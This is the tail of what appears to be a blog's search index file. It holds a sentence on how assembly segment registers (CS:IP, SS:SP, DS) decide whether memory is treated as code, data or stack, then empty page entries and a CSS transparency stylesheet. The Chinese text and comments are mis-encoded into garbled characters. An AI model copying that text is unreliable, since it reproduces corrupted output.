åˆ°åº•å¦‚ä½•å¤„ç†æˆ‘ä»¬å®šä¹‰çš„æ®µä¸­çš„å†…å®¹ï¼Œæ˜¯å½“ä½œæŒ‡ä»¤æ‰§è¡Œï¼Œå½“ä½œæ•°æ®è®¿é—®ï¼Œè¿˜æ˜¯å½“ä½œæ ˆç©ºé—´ï¼Œå®Œå…¨æ˜¯é ç¨‹åºä¸­å…·ä½“çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œå’Œæ±‡ç¼–æŒ‡ä»¤å¯¹ CS:IPã€SS:SPã€DS ç­‰å¯„å­˜å™¨çš„è®¾ç½®æ¥å†³å®šçš„ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>navigate</title>
      <link href="/navigate/index.html"/>
      <url>/navigate/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/transpancy.css"/>
      <url>/css/transpancy.css</url>
      
        <content type="html"><![CDATA[/* æ–‡ç« é¡µèƒŒæ™¯ */.layout_post>#post {    /* ä»¥ä¸‹ä»£è¡¨é€æ˜åº¦ä¸º0.7 å¯ä»¥è‡ªè¡Œä¿®æ”¹*/    background: rgba(255, 255, 255, .7);}/* æ‰€æœ‰é¡µé¢èƒŒæ™¯ */#aside_content .card-widget,#recent-posts>.recent-post-item,.layout_page>div:first-child:not(.recent-posts),.layout_post>#page,.layout_post>#post,.read-mode .layout_post>#post {    /* ä»¥ä¸‹ä»£è¡¨é€æ˜åº¦ä¸º0.7 */    background: rgba(255, 255, 255, .7);}/*ä¾§è¾¹å¡ç‰‡çš„é€æ˜åº¦ */:root {    --card-bg: rgba(255, 255, 255, .7);}/* é¡µè„šé€æ˜ */#footer {    /* ä»¥ä¸‹ä»£è¡¨é€æ˜åº¦ä¸º0.7 */    background: rgba(255, 255, 255, .0);}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
